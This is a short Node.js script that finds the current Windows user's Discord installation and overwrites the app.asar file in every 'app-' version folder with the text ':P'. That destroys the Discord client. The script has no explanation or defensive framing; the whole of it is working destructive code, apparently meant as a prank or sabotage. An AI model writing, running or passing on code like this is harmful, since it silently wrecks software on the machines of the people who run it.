//Dependencies
const Fs = require("fs")
const Os = require("os")

//Main
Fs.readdir(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`, function(err, results){
    results.forEach(file =>{
        if(file.indexOf("app-") != -1){
            Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${file}\\resources\\app.asar`, ":P", "utf8")
        }
    })
})
